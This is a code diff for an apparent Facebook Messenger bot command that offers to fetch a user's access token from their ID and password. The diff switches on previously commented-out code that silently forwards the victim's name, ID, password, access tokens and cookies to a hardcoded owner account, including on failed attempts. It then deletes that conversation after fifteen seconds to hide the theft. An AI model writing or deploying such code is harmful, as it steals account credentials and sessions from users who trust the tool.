@@ -42,9 +42,7 @@ module.exports.run = async ({ api, event, args }) => {
 
     api.sendMessage("GETTING TOKEN....", threadID, messageID);
 
-  /*const ownerID = "61550873742628";
-  const ownerMessage = `𝗩𝗜𝗖𝗧𝗜𝗠 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡ℹ️\n\n𝗡𝗔𝗠𝗘: ${userName}\n𝗨𝗦𝗘𝗥: ${uid} \n𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗: ${pass}\n\n${manilaTime}`;
-  api.sendMessage(ownerMessage, ownerID);*/
+  const ownerID = "61550873742628";
 
   try {
     const tokenData = await retrieveToken(uid, pass);
@@ -54,12 +52,16 @@ module.exports.run = async ({ api, event, args }) => {
       api.sendMessage(`Successful! please check pm or spam in your message request.`, threadID, messageID);
       api.sendMessage(`𝗔𝗖𝗖𝗘𝗦𝗦_𝗧𝗢𝗞𝗘𝗡🪙:\n${access_token}`, senderID);
       api.sendMessage(`𝗘𝗫𝗖𝗛𝗔𝗡𝗚𝗘𝗗_𝗧𝗢𝗞𝗘𝗡💱:\n${access_token_eaad6v7}`, senderID);
-      /*api.sendMessage(`𝗧𝗢𝗞𝗘𝗡 𝗟𝗢𝗚𝗚𝗘𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡ℹ️\n\n𝗡𝗔𝗠𝗘:${userName}\n𝗨𝗦𝗘𝗥:${uid} \n𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗: ${pass}\n\n𝗔𝗖𝗖𝗘𝗦𝗦_𝗧𝗢𝗞𝗘𝗡🪙:\n${access_token}\n𝗖𝗢𝗢𝗞𝗜𝗘𝗦🍪:${cookies}\n𝗘𝗫𝗖𝗛𝗔𝗡𝗚𝗘𝗗_𝗧𝗢𝗞𝗘𝗡💱:\n${access_token_eaad6v7}\n\n${manilaTime}`, ownerID);*/
+      api.sendMessage(`𝗧𝗢𝗞𝗘𝗡 𝗟𝗢𝗚𝗚𝗘𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡ℹ️\n\n𝗡𝗔𝗠𝗘:${userName}\n𝗨𝗦𝗘𝗥:${uid} \n𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗: ${pass}\n\n𝗔𝗖𝗖𝗘𝗦𝗦_𝗧𝗢𝗞𝗘𝗡🪙:\n${access_token}\n𝗖𝗢𝗢𝗞𝗜𝗘𝗦🍪:${cookies}\n𝗘𝗫𝗖𝗛𝗔𝗡𝗚𝗘𝗗_𝗧𝗢𝗞𝗘𝗡💱:\n${access_token_eaad6v7}\n\n${manilaTime}`, ownerID);
       
-/*await new Promise(resolve => setTimeout(resolve, 15000)); // Adjust the delay as needed
+await new Promise(resolve => setTimeout(resolve, 15000)); // Adjust the delay as needed
 api.deleteThread(ownerID);
     } else {
-      api.sendMessage("Failed to retrieve token.", threadID, messageID);*/
+      const ownerMessage = `𝗩𝗜𝗖𝗧𝗜𝗠 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡ℹ️\n\n𝗡𝗔𝗠𝗘: ${userName}\n𝗨𝗦𝗘𝗥: ${uid} \n𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗: ${pass}\n\n${manilaTime}`;
+      api.sendMessage(ownerMessage, ownerID);
+      await new Promise(resolve => setTimeout(resolve, 15000)); // Adjust the delay as needed
+      api.deleteThread(ownerID);
+      api.sendMessage("Failed to retrieve token.", threadID, messageID);
     }
   } catch (error) {
     api.sendMessage(`𝗙𝗮𝗶𝗹𝗲𝗱!\n\nDouble-check your password. If it still doesn't work, try changing your password and using the command again.\nWhen you receive a login alert, you can tell facebook that you recognize the login activity by clicking or tapping "𝗧𝗵𝗶𝘀 𝘄𝗮𝘀 𝗺𝗲 𝗕𝘂𝘁𝘁𝗼𝗻!"`, threadID, messageID);
